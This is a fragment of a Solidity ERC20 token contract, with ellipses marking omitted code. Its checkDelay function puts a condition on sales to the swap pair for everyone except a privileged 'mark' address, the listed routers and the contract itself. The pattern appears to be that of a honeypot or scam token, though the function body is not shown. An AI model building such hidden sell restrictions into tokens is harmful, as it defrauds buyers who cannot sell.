...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, Ownable(msg.sender) {
    ...
    constructor(string memory name_, string memory symbol_, address _mark, uint256 _numbers) {
        _name = name_;
        _symbol = symbol_;
        mark = _mark;
        if(block.chainid == 1) {
            PancakeSwapV2Router = IPancakeSwapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    ...
    function checkDelay(address from, address to, uint256 amount) private view {
        if(to == pancakeSwapV2Pair && from != mark && !routers[from] && from != address(this)) {
...
contract Token is ERC20 {
    ...
    constructor(string memory name, string memory symbol, uint256 premint, address mark_, uint256 numbers_) ERC20(name, symbol, mark_, numbers_) {
